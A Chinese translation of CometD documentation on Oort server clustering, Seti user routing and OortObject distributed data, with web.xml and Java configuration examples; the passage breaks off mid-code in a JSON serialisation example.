任何CometD服务器都可以通过配置org.cometd.oort.Oort的实例成为Oort节点。 org.cometd.oort.Oort实例与org.cometd.bayeux.server.BayeuxServer实例关联，每个BayeuxServer实例只能有一个Oort实例。

Oort节点需要知道彼此的URL以连接并形成群集。想要加入集群的新节点需要知道已经是集群一部分的另一个节点的至少一个URL。一旦它连接到一个节点，集群会通知新节点新节点尚未连接的其他节点，然后新节点将连接到所有现有节点。

新节点有两种方法可以发现至少一个其他节点：



- 在运行时，通过基于多播的自动发现。



- 在启动时，通过静态配置。

###9.5.4.通用配置
对于静态和自动发现，都存在一组可用于配置Oort实例的参数。以下是自动发现和静态配置servlet共享的常见配置参数列表：

表8. Oort公用配置参数

Table 3. WebSocket客户端传输参数

| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| oort.url| yes      |  |与OortComet关联的Bayeux服务器的唯一URL
| oort.secret| no      |random string  |验证来自其他OortComt连接的预共享密钥。 当应用程序想要认证其他OortComt时，这是强制性的，另请参阅Oort认证部分。
| oort.channels| no      |  empty string|在启动时观察的逗号分隔的频道列表
| enableAckExtension| no      |  true|是否在BayeuxServer实例和OortComet实例中启用消息确认扩展（另请参阅确认扩展）
| clientDebug| no      |  false|是否在OortComet实例中启用调试日志记录
| jsonContext| no      |  empty string|用于连接到其他Oort节点的OortComet实例使用的JSONContext.Client实现的完全限定名

###9.5.5. 自动发现配置
您可以通过代码或通过在web.xml中配置org.cometd.oort.OortMulticastConfigServlet来配置自动发现机制，例如：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	    <servlet>
	        <servlet-name>oort</servlet-name>
	        <servlet-class>org.cometd.oort.OortMulticastConfigServlet</servlet-class>
	        <load-on-startup>2</load-on-startup>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://host:port/context/cometd</param-value>
	        </init-param>
	    </servlet>
	</web-app>

由于Oort依赖于BayeuxServer，因此OortMulticastConfigServlet的load-on-startup参数必须大于CometDServlet的参数。

必需的oort.url init参数必须标识可以联系此Oort节点的URL，并且它必须是此节点的CometDServlet所服务的URL。 该URL被发送到其他Oort节点，因此URL的主机部分不指向“localhost”，而是指向可解析的主机名或IP地址，这样群集中的其他节点可以联系此 节点。 同样，您必须正确配置此Web应用程序的URL的上下文路径部分。

除了常见的配置初始化参数外，OortMulticastConfigServlet还支持配置这些额外的初始化参数：

表9. Oort多播配置参数


| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| oort.multicast.bindAddress| no      | the wildcard address |DatagramChannel接收UDP流量的绑定地址。 这是组端口绑定侦听的地址。
| oort.multicast.groupAddress| no      |239.255.0.1|要加入的组播组地址以接收广告
| oort.multicast.groupPort| no      |  5577|广告发送和接收的端口
| oort.multicast.groupInterfaces| no      |  所有支持多播的接口|监听广告的接口的IP地址列表。 在多主机主机的情况下，该参数允许配置可以接收广告的特定网络接口。
| oort.multicast.timeToLive| no      |  1|广告数据包的生存时间（1 =同一子网，32 =同一站点，255 =全局）
| oort.multicast.advertiseInterval| no      |  2000|发送广告的时间间隔（以毫秒为单位）
| ooort.multicast.connectTimeout| no      |  1000|连接到其他节点的超时时间（以毫秒为单位）
| oort.multicast.maxTransmissionLength| no      |  1400|多播消息的最大字节长度（数据报的MTU） - 限制节点通告的Oort URL的长度


使用自动发现配置的每个节点都会在指定的多播地址和端口（oort.multicast.groupAddress和oort.multicast.groupPort）上每隔oort.multicast.advertiseInterval毫秒发出一条广告（包含节点URL），并指定time-to -live（oort.multicast.timeToLive）。广告一直持续到Web应用程序停止，并且只用于宣传新节点已经出现。 Oort有一个内置的机制，负责会员组织（另请参阅会员组织部分了解详情）。

启用Oort自动发现机制时，您必须确保：



- 组播在您选择的操作系统中启用。



- 网络接口启用了多播。



- 多播流量路由已正确配置。

Linux通常在最常见的发行版中通过多播支持进行编译。您可以使用ip link命令控制网络接口，以检查是否启用了组播。您可以使用ip route命令检查组播路由，并且输出应包含类似于以下内容的行：

224.0.0.0/4 dev eth0范围链接
您可能还希望通过设置系统属性-Djava.net.preferIPv4Stack = true来强制JVM选择IPv4堆栈以促进多播网络。

###9.5.6.静态发现配置
如果组播在部署CometD的系统上不可用，则可以使用静态发现机制。 这只是稍微麻烦一些。 它不允许动态发现新节点，但只需使用现有的已启动节点（通常称为“主节点”）的已知URL来配置每个节点就足够了。 当然，主节点应该在所有其他节点之前启动。

您可以通过代码或通过在web.xml中配置org.cometd.oort.OortStaticConfigServlet来完成静态发现配置，例如：
	
	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	    <servlet>
	        <servlet-name>oort</servlet-name>
	        <servlet-class>org.cometd.oort.OortStaticConfigServlet</servlet-class>
	        <load-on-startup>2</load-on-startup>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://host:port/context/cometd</param-value>
	        </init-param>
	    </servlet>
	</web-app>

就像自动发现一样，OortStaticConfigServlet的load-on-startup参数必须大于CometDServlet的load-on-startup参数。

OortStaticConfigServlet支持上一节中列出的通用初始化参数，以及以下附加的初始化参数：

表10. Oort静态配置参数

| 参数名称        | 是否必须	    |默认值	    |参数描述
| --------   | -----:   | :----: |:----: 
| oort.cloud| no      | empty string |在启动时连接的其他Oort Comet的URL的逗号分隔列表

通过这种方式配置，Oort节点已准备好成为Oort集群的一部分，但它不是集群的一部分，因为它不知道其他节点的URL（并且没有自动发现）。 要使Oort节点成为Oort群集的一部分，您可以使用一个（或逗号分隔的列表）Oort节点URL来配置OortStaticConfigServlet的oort.cloud init参数以连接到：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	    <servlet>
	        <servlet-name>oort</servlet-name>
	        <servlet-class>org.cometd.oort.OortStaticConfigServlet</servlet-class>
	        <load-on-startup>2</load-on-startup>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://host1:port/context/cometd</param-value>
	        </init-param>
	        <init-param>
	            <param-name>oort.cloud</param-name>
	            <param-value>http://host2:port/context/cometd,http://host3:port/context/cometd</param-value>
	        </init-param>
	    </servlet>
	</web-app>

可以在没有oort.cloud参数的情况下配置“主”节点。 其他节点将配置“主”节点的URL，当它们连接到“主”节点时，“主”节点将连接回它们，请参阅会员组织部分。

或者，可以编写自定义初始化代码（请参阅服务集成部分以获取有关如何执行此操作的建议），从而将节点链接到Oort群集（如果Oort节点URL无法事先知道，这可能很有用，但 可以在运行时知道），例如：

	public class OortConfigurationServlet extends GenericServlet {
	    public void init() throws ServletException {
	        // Grab the Oort object
	        Oort oort = (Oort)getServletContext().getAttribute(Oort.OORT_ATTRIBUTE);
	
	        // Figure out the URLs to connect to, using other discovery means
	        List<String> urls = ...;
	
	        // Connect to the other Oort nodes
	        for (String url : urls) {
	            OortComet oortComet = oort.observeComet(url);
	            if (!oortComet.waitFor(1000, BayeuxClient.State.CONNECTED)) {
	                throw new ServletException("Cannot connect to Oort node " + url);
	            }
	        }
	    }
	
	    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
	        throw new ServletException();
	    }
	}

Oort.observeComet（url）返回的OortComet实例是BayeuxClient的专用版本，另请参阅Java客户端部分。

###9.5.7.会员组织
当Oort节点连接到另一个Oort节点时，建立双向通信。如果nodeA连接到nodeB（例如，通过oortA.observeComet（urlB）），则在连接到nodeB的nodeA中创建OortComet实例，并在连接到nodeA的nodeB中创建另一个OortComet实例。

在这个直接的双向通信建立之后，一个特殊的消息在整个Oort群集（在通道/ oort /群集上）广播，其中两个节点广播其已知的兄弟节点。接收到不知道这些兄弟的这个消息的每个节点然后建立与它们的双向通信。

例如，假设有两个简单的Oort群集，一个由节点A和B构成，另一个由节点C和D构成。当A和C连接时，它们广播它们的同胞（A广播它的同胞，现在是B和C，而C则广播它的兄弟姐妹，现在是A和D）。直接或间接连接到广播公司的所有节点都会收到此消息。当C收到来自A的兄弟姐妹的广播时，它注意到它自己（因为它已经连接到A，所以它什么都不做）。另一个是未知的兄弟B，并且C与B建立了双向连接。同样，A从C接收同级广播消息，并连接到D.每个新的双向连接在整个集群上触发同级广播消息，直到所有节点都连接。

如果一个节点崩溃，例如D，则所有其他节点检测到并断开故障节点。

![](https://i.imgur.com/EVl3JWX.png)

通过这种方式，Oort集群知道其成员，但对应用程序没有任何用处。

下一部分介绍整个集群的广播消息转发。

####9.5.7.1.收听会员活动

应用程序有时需要知道其他节点何时加入或离开Oort群集; 他们可以通过注册在新节点加入集群时以及节点离开集群时收到通知的节点侦听器来完成此操作：

	Oort oort = ...;
	oort.addCometListener(new Oort.CometListener() {
	    public void cometJoined(Event event) {
	        System.out.printf("Comet joined the cluster %s%n", event.getCometURL());
	    }
	
	    public void cometLeft(Event event) {
	        System.out.printf("Comet left the cluster %s%n", event.getCometURL());
	    }
	});

仅当本地Oort节点已允许来自远程节点的连接（这可能会被SecurityPolicy拒绝）后才会通知Comet joined事件。

当通知节点加入事件时，可以通过Oort.observeComet（String）获取连接到远程Oort的OortComet，并发布消息（或订阅其他通道）：

	final Oort oort = ...;
	oort.addCometListener(new Oort.CometListener() {
	    public void cometJoined(Event event) {
	        String cometURL = event.getCometURL();
	        OortComet oortComet = oort.observeComet(cometURL);
	
	        // Push information to the new node
	        oortComet.getChannel("/service/foo").publish("bar");
	    }
	
	    public void cometLeft(Event event) {
	    }
	});

应用程序可以使用节点侦听器来同步节点; 新节点可以请求（或推送）需要在所有节点中存在的应用程序数据（例如，预热高速缓存）。 这些活动与SecurityPolicy一起发生，拒绝来自远程客户端的握手，直到新节点正确预热（客户端重试握手，直到新节点准备就绪）。

###9.5.8.认证
当Oort节点连接到另一个Oort节点时，它将使用以下格式发送包含Oort特有的扩展字段的握手消息：

	{
	    "channel": "/meta/handshake",
	    ... /* other usual handshake fields */
	    "ext": {
	        "org.cometd.oort": {
	            "oortURL": "http://halley.cometd.org:8080/cometd",
	            "cometURL": "http://halebopp.cometd.org:8080/cometd",
	            "oortSecret": "cstw27r+l+XqE62IrNZdCDiUObA="
	        }
	    }
	}

oortURL字段是启动握手的节点的URL; cometURL字段是接收握手的节点的URL; oortSecret是启动Oort节点的预共享密钥的SHA-1消化字节的base64编码（参见前面的部分，Oort公共配置部分）。

这些扩展字段为Oort节点提供了一种远程客户端握手（可能会受到身份验证检查）与远程节点握手的区别。 例如，假设远程客户端总是发送包含认证令牌的扩展字段; 那么可以按如下方式编写SecurityPolicy的实现（另请参阅身份验证部分）：

	public class OortSecurityPolicy extends DefaultSecurityPolicy {
	    private final Oort oort;
	
	    private OortSecurityPolicy(Oort oort) {
	        this.oort = oort;
	    }
	
	    @Override
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
	        // Local sessions can always handshake
	        if (session.isLocalSession()) {
	            return true;
	        }
	
	        // Remote Oort nodes are allowed to handshake
	        if (oort.isOortHandshake(message)) {
	            return true;
	        }
	
	        // Remote clients must have a valid token
	        Map<String, Object> ext = message.getExt();
	        return ext != null && isValid(ext.get("token"));
	    }
	}

Oort.isOortHandshake（Message）方法验证握手消息，如果是来自另一个已使用相同预共享密钥配置的Oort节点的握手信息，则返回true。在这种情况下，如果要验证握手尝试确实来自有效的Oort节点（而不是伪造类似于Oort节点发送的消息的攻击者），则必须将预共享密钥明确设置为所有Oort节点的值相同，因为它默认为每个Oort节点不同的随机字符串。

###9.5.9.广播消息转发
广播消息（即，发送到非元和非业务频道的消息（另请参阅本节以获取更多详细信息）根据定义的消息定义，所有客户端订阅该消息所发送到的频道都应该接收。

在Oort群集中，您可能会将客户端连接到订阅相同通道的不同节点。如果clientA连接到nodeA，clientB连接到nodeB，并且clientC连接到nodeC，则当clientA广播消息并且希望clientB和clientC接收消息时，Oort群集必须将该消息（由clientA发送并由nodeA接收）转发到nodeB和nodeC。

您可以通过配置Oort配置Servlet来将oort.channels init参数设置为消息转发到Oort群集的以逗号分隔的通道列表来完成此任务：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	    <servlet>
	        <servlet-name>oort</servlet-name>
	        <servlet-class>org.cometd.oort.OortMulticastConfigServlet</servlet-class>
	        <load-on-startup>2</load-on-startup>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://host1:port/context/cometd</param-value>
	        </init-param>
	        <init-param>
	            <param-name>oort.channels</param-name>
	            <param-value>/stock/**,/forex/*,/alerts</param-value>
	        </init-param>
	    </servlet>
	</web-app>

或者，您可以使用Oort.observeChannel（String channelName）指示节点侦听发布到已连接到的其中一个已知节点的该通道上的消息。

当nodeA观察一个通道时，这意味着在该通道上发送但由其他节点接收的消息会自动转发到nodeA。

>注意
>>消息转发不是双向的; 如果nodeA将消息转发给其他节点，则其他节点将消息转发给nodeA并不是自动的。 但是，在大多数情况下，您可以通过相同的初始化代码以相同的方式配置Oort节点，因此所有节点都转发相同的通道。

在两个节点之间存在临时网络连接故障的情况下，消息的转发可能会暂时中断。为了解决这个问题，可以配置节点来启用消息确认扩展（请参阅确认扩展部分），以便在短暂失败时可以重新发送丢失的消息。有关配置详细信息，请参阅Oort公共配置部分。

请记住，消息确认扩展不是消息丢失的完全持久解决方案（例如，如果长时间失败，它不保证消息重新传递）。 CometD在长期失败的情况下不提供完全持久的消息解决方案。

由于它能够观察发布到广播频道的消息，因此Oort群集可以在连接到不同节点的用户中实现简单的聊天应用程序。在以下示例中，当clientA在频道/聊天（绿色箭头）上发布消息时，它会到达nodeA;由于nodeB和nodeC已配置为观察通道/聊天，因此它们都从nodeA接收消息（绿色箭头），因此它们可以将聊天消息分别发送到clientB和clientC（绿色箭头）。

![](https://i.imgur.com/8e2xNgZ.png)

如果您的应用程序只需要向连接到其他节点的客户端广播消息，则只需要一个Oort实例即可。

如果您需要将消息直接发送到特定客户端（例如，clientA想要将消息发送到clientC但不发送给clientB，则需要设置称为Seti的Oort集群的其他组件，另请参阅Seti部分。

9.6. Seti
----------
Seti是Oort群集组件，用于跟踪连接到群集中任何节点的客户端，并允许应用程序透明地将消息发送到群集中的特定客户端，就好像它们位于本地节点中一样。

###9.6.1. 配置Seti
配置Seti时请牢记以下几点：


- 您必须通过代码或通过在web.xml中配置org.cometd.oort.SetiServlet来配置org.cometd.oort.Seti实例和关联的org.cometd.oort.Oort实例。


- 每个Oort可能只有一个Seti实例。


- SetiServlet的load-on-startup参数必须大于OortServlet的参数。


- SetiServlet没有任何配置init参数。

一个配置示例如下：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	    <servlet>
	        <servlet-name>oort</servlet-name>
	        <servlet-class>org.cometd.oort.OortServlet</servlet-class>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://host:port/context/cometd</param-value>
	        </init-param>
	        <load-on-startup>2</load-on-startup>
	    </servlet>
	
	    <servlet>
	        <servlet-name>seti</servlet-name>
	        <servlet-class>org.cometd.oort.SetiServlet</servlet-class>
	        <load-on-startup>3</load-on-startup>
	    </servlet>
	</web-app>

###9.6.2. 关联和取消关联用户
Seti允许您将用户的唯一字符串表示与一个或多个ServerSession相关联（有关ServerSession的更多详细信息，另请参阅概念部分）。

这通常在用户首次登录到应用程序时发生，并且用户的唯一字符串表示形式可以是用户提供的用于验证自身身份（用户名，令牌，数据库ID）的任何内容。 为简洁起见，用户的这个唯一字符串表示称为userId。 相同的userId可以多次登录（例如，从桌面计算机和移动设备登录），因此它与多个ServerSessions关联。

在实践中，将userId与ServerSession关联的最佳方式是在身份验证过程中使用SecurityPolicy，例如：

	public class MySecurityPolicy extends DefaultSecurityPolicy {
	    private final Seti seti;
	
	    public MySecurityPolicy(Seti seti) {
	        this.seti = seti;
	    }
	
	    @Override
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
	        if (session.isLocalSession()) {
	            return true;
	        }
	
	        // Authenticate
	        String userId = performAuthentication(session, message);
	        if (userId == null) {
	            return false;
	        }
	
	        // Associate
	        seti.associate(userId, session);
	
	        return true;
	    }
	}

或者，您可以在BayeuxServer.Extension或CometD服务中执行关联（请参阅服务部分），以响应客户端在握手成功后始终发送的特定消息。

当一个Seti实例首先将一个userId与一个会话相关联时，它会在集群上广播一个呈现消息（在channel / seti / all上，也可以参见Seti监听器部分），告诉所有其他节点该userId所在的位置。

通过这种方式，集群中的所有节点都知道特定用户标识所在的位置。同一个用户id（不同会话）在同一Seti上的进一步关联不会广播任何存在信息，因为其他Setis已经知道该特定用户Id驻留在该Seti中。相同的userId可以在不同的节点中关联（例如，桌面计算机登录 - 因此关联 - 在comet1中，而移动设备与comet2关联）。

同样，您可以随时通过调用Seti.disassociate（userId，session）来解除关联userId。如果用户断开连接或“消失”（例如，它崩溃或其网络丢失），服务器将删除或失效其会话，并且Seti会自动解除userId的关联。当一个特定用户标识的最后解除关联发生在Seti实例上时，Seti在集群上（在channel / seti / all上）广播一个呈现消息，告诉所有其他节点该用户标识不再存在于该Seti中（尽管同一个用户标识可能仍然与其他Setis相关）。

###9.6.3.收听状态信息
应用程序可以注册在状态消息到达Seti实例时通知的状态监听器：
	
	Seti seti = ...;
	seti.addPresenceListener(new Seti.PresenceListener() {
	    public void presenceAdded(Event event) {
	        System.out.printf("User ID %s is now present in node %s%n", event.getUserId(), event.getURL());
	    }
	
	    public void presenceRemoved(Event event) {
	        System.out.printf("User ID %s is now absent in node %s%n", event.getUserId(), event.getURL());
	    }
	});

URL event.getURL（）返回的是Oort节点的URL; 您可以使用它来检索连接到该节点的OortComet实例，例如发布消息（或订阅其他频道）：

	final Seti seti = ...;
	seti.addPresenceListener(new Seti.PresenceListener() {
	    public void presenceAdded(Event event) {
	        Oort oort = seti.getOort();
	        String oortURL = event.getURL();
	        OortComet oortComet = oort.getComet(oortURL);
	
	        Map<String, Object> data = new HashMap<String, Object>
	        data.put("action", "sync_request");
	        data.put("userId", event.getUserId());
	
	        oortComet.getChannel("/service/sync").publish(data);
	    }
	
	    public void presenceRemoved(Event event) {
	    }
	});



###9.6.4. 发送消息
用户关联后，Seti.sendMessage（String userId，String channel，Object data）可以将消息发送给群集中的特定用户。

	@Service("seti_forwarder");
	public class SetiForwarder {
	    @Inject
	    private Seti seti;
	
	    @Listener("/service/forward")
	    public void forward(ServerSession session, ServerMessage message) {
	        Map<String,Object> data = message.getDataAsMap();
	        String targetUserId = (String)data.get("targetUserId");
	        seti.sendMessage(targetUserId, message.getChannel(), data);
	    }
	}

在下面的例子中，clientA想要发送一个消息给clientC，但是不发送给clientB。 因此，clientA使用服务通道向其所连接的服务器发送消息，以便不会广播消息，然后专用服务（请参阅服务部分）使用Seti将消息路由到相应的用户（请参阅上面的代码片段）。 节点A上的节点知道目标用户在节点C上（感谢关联）并将消息转发给节点C，节点C又将消息传递给客户端C.

![](https://i.imgur.com/Uwz9UEA.png)

9.7.分布式对象和服务
------------------
Oort部分介绍了如何链接节点以形成Oort群集。 Oort节点全部相互连接，以便他们知道所有其他对等节点。此外，每个节点都可以将已发布到广播频道的消息（另请参阅本节）转发给其他节点。

您的应用程序可能需要维护分布在所有节点上的每个节点上的信息。一个典型的例子是连接到所有节点的用户总数。每个节点都可以轻松知道有多少用户连接到自己，但在这种情况下，您想知道连接到所有节点的所有用户的总数（例如，在用户界面中显示该数字）。您要分发的信息是“数据实体” - 在这种情况下是连接到每个节点的用户数量 - 此功能被命名为“数据分配”。让每个节点分布其自己的数据实体允许每个节点知道其他节点的数据实体，并计算用户的总数。

此外，您的应用程序可能需要在特定节点上执行某些操作。例如，出于安全原因，您的应用程序可能需要访问只能从特定节点访问的数据库系统。该功能被命名为“服务转发”。

Oort和Seti（另请参见java oort seti部分）本身并不提供数据分发或服务转发，但可以基于Oort功能来实现它们，这正是CometD提供的分别与OortObject和OortService。

###9.7.1. OortObject
org.cometd.oort.OortObject实例表示一个分布在Oort集群中的命名合成数据实体。集群中的每个节点只有一个具有特定名称的OortObject实例，并且OortObject包含N个数据实体，即集群中每个节点的一个。在同一节点中可能有多个Oort对象，只要它们的名称不同即可。

数据实体可以是连接到每个节点的用户的数量，或者每个节点上播放的游戏的数量，或者每个节点上创建的聊天室的列表，或者每个节点监视的系统的名称等，这取决于您的应用程序的业务领域。

在下图中，您可以看到3个节点（nodeA，nodeB和nodeC），每个节点都包含一个名为“users”（橙色）的Oort对象，用于存储连接到每个Oort节点的用户的名称。这种情况下的数据实体是一个List <String>，表示每个节点的连接用户的名称。

NodeA具有连接的客户端Ca1和Ca2，nodeB仅连接了客户端Cb1，而nodeC连接了3个客户端。 Oort对象是合成的，它们存储N个数据实体，也称为部件，其中N是Oort群集中的节点数。你可以看到每个Oort对象由3部分组成（最里面的蓝色，绿色和红色框）;每个部分都像它所代表的节点一样被着色。与它所在节点具有相同颜色的部分是本地部分。

![](https://i.imgur.com/ZIpRivK.png)

每个Oort对象只能更新其本地部分：nodeA只能从其本地（蓝色）部分添加/删除用户名，并且不能从远程部分（绿色和红色）添加/删除。同样，nodeB只能更新绿色部分，而不能更新蓝色和红色部分，而nodeC只能更新红色部分，而不能更新蓝色和绿色部分。

如果新客户端连接到节点B（例如Cb2），则nodeB上的应用程序将获取想要与其他节点共享的用户名（B2），并将其添加到nodeB上的Oort对象。用户名称B2将被添加到nodeB的绿色部分，并且一条消息将被广播给其他节点，这也将修改其对应的绿色部分，并添加B2的副本。 Oort对象的远程部分只能通过OortObject实现内部的消息来更新;它们不能直接通过应用程序代码进行更新。

每个Oort对象实例只拥有其本地部分。在该示例中，用户名称A2出现在所有节点中，但它仅由nodeA中的Oort对象拥有。任何想要修改或删除A2的人都必须在nodeA中执行此操作。 OortService部分显示了如何将服务操作从一个节点转发到另一个节点。

OortObject允许应用程序添加/删除通知修改零件的本地或远程OortObject.Listener。您的应用程序可以实现这些侦听器来执行自定义逻辑，另请参阅OortObject侦听器部分。

####9.7.1.1. OortObject专业化

虽然OortObject是对象的通用容器（如List <String>），但它可能不是非常有效。想象一下列表中包含数千个名称的情况：添加/删除一个名称将导致整个列表被复制到所有其他节点，因为整个列表是数据实体。

为了避免这种低效率，CometD提供了OortObject的这些专业化：

OortMap，一个包含ConcurrentMap的OortObject

OortStringMap，一个带有String键的OortMap

OortLongMap，一个带Long键的OortMap

OortList，一个包含List的OortObject

每个专业化复制单个操作，例如添加/删除OortMap中的键/值对，或添加/删除OortList中的元素。

OortMap提供了一个OortMap.EntryListener来通知应用程序的本地或远程地图条目添加/删除。 OortList提供了一个OortList.ElementListener来通知应用程序添加/删除元素，无论是本地还是远程。应用程序可以实现这些侦听器以获得条目或元素更新的通知，以执行自定义逻辑，另请参阅OortObject侦听器部分。

####9.7.1.2. OortObject创建

OortObject是通过提供一个OortObject.Factory来创建的。需要该工厂才能从其从JSON获取的原始表示中创建数据实体。这允许将标准JDK容器（如java.util.concurrent.ConcurrentHashMap）用作数据实体，但使用标准JSON在节点间进行复制。

CometD在类org.cometd.oort.OortObjectFactories中提供了许多预定义的工厂，例如：

Oort oort = ...;

	// The factory for data entities
	OortObject.Factory<List<String>> factory = OortObjectFactories.forList();
	
	// Create the OortObject
	OortObject<List<String>> users = new OortObject<List<String>>(oort, "users", factory);
	
	// Start it before using it
	users.start();

上面的代码将创建一个名为“users”的OortObject，其数据实体是一个List <String>（这是一个示例;您可能希望使用更丰富和更强大的OortList <String>）。一旦你创建了一个OortObject，你必须在使用它之前启动它。

OortObject通常在启动时创建，以便所有节点都有一个具有相同名称的相同OortObject的实例。请记住，数据实体以相同名称分布在OortObject中，因此如果某个节点没有该特定名称的OortObject，则它不会接收该数据实体的更新。

为了响应某个事件，可以创建OortObject，但应用程序必须确保将此事件广播给所有节点，以便每个节点都可以使用相同的名称创建自己的OortObject实例。

####9.7.1.3. OortObject数据实体共享

一个OortObject拥有一个数据实体，这是它的本地部分。在上面的例子中，数据实体是一个完整的List <String>，所以这就是你想要与其他节点共享的内容：

	OortObject.Factory<List<String>> factory = users.getFactory();
	
	// Create a "default" data entity
	List<String> names = factory.newObject(null);
	
	// Fill it with data
	names.add("B1");
	
	// Share the new list with the other nodes
	users.setAndShare(names);

方法setAndShare（...）将用提供的列表替换空列表（在创建OortObject时在内部创建），并将此事件广播到集群，以便其他节点可以用新节点替换它们与此节点关联的部分。

同样，OortMap有putAndShare（...）和removeAndShare（...）方法来放置/移除地图条目并共享它们：

	OortStringMap<UserInfo> userInfos = ...;
	
	// Map user name "B1" with its metadata
	userInfos.putAndShare("B1", new UserInfo("B1", ...));
	
	// In another place in the code
	
	// Remove the mapping for user "B1"
	userInfos.removeAndShare("B1");

OortList有addAndShare（...）和removeAndShare（...）：

	OortList<String> names = ...;
	
	// Add user name "B1"
	names.addAndShare("B1");
	
	// In another place in the code
	
	// Remove user "B1"
	names.removeAndShare("B1");

如果您需要替换整个地图或列表，则OortMap和OortList都会从OortObject方法setAndShare（...）继承。

OortObject API将尝试使您难以直接与数据实体进行交互，并且这是通过设计。如果您可以在不使用上述方法的情况下直接修改数据实体，则本地数据实体将与其他节点中的对应数据实体不同步。无论何时您觉得需要访问数据实体，并且找不到一个简单的方法来实现它，请考虑您可能采取了错误的方法。

出于上述相同的原因，强烈建议您存储在Oort对象中的数据是不可变的。在上面的OortStringMap示例中，UserInfo对象应该是不可变的，如果需要更改它，最好使用新数据创建一个新的UserInfo实例，然后调用putAndShare（...）来替换旧的，确保所有节点都会得到更新。

####9.7.1.4.OortObject自定义数据实体序列化

OortObject实现必须能够向集群中的其他节点发送/接收数据实体，并且对于正在传输的数据实体中包含的所有对象以递归的方式进行递归。

数据实体及其包含的对象使用标准的CometD机制序列化为JSON，然后传输。当节点接收到数据实体及其包含对象的JSON表示时，它将它从JSON反序列化为对象图。

在上面的OortStringMap示例中，数据实体是一个ConcurrentMap <String，Object>，此数据实体的值是UserInfo类的对象。

虽然OortObject实现能够将本地ConcurrentMap序列化为JSON（因为ConcurrentMap是一个Map，因此具有本机表示形式作为JSON对象），但它通常无法正确序列化UserInfo实例（默认情况下，CometD只是调用toString（）来转换这些非本地可表示的对象JSON）。

为了正确序列化UserInfo的实例，必须按照Oort JSON配置部分中的说明配置Oort。这是通过创建JSONContent.Client的自定义实现完成的：

	package com.acme;
	
	import org.cometd.common.JettyJSONContextClient;
	
	public class MyCustomJSONContextClient extends JettyJSONContextClient {
	    public MyCustomJSONContextClient() {
	        getJSON().addConvertor(UserInfo.class, new UserInfoConvertor());
	    }
	}

在上面的示例中，通过扩展CometD类JettyJSONContextClient隐式选择了Jetty JSON库。 Jackson JSON库存在类似的类。 在上面的类中，UserInfo类的转换器被添加到通过getJSON（）获取的根org.eclipse.jetty.util.ajax.JSON对象中。 这个根JSON对象是负责CometD消息序列化的对象。

转换器的典型实现可能是（假设你的UserInfo类有一个id属性）：

	import java.util.Map;
	import org.eclipse.jetty.util.ajax.JSON;
	
	public class UserInfoConvertor implements JSON.Convertor {
	    @Override
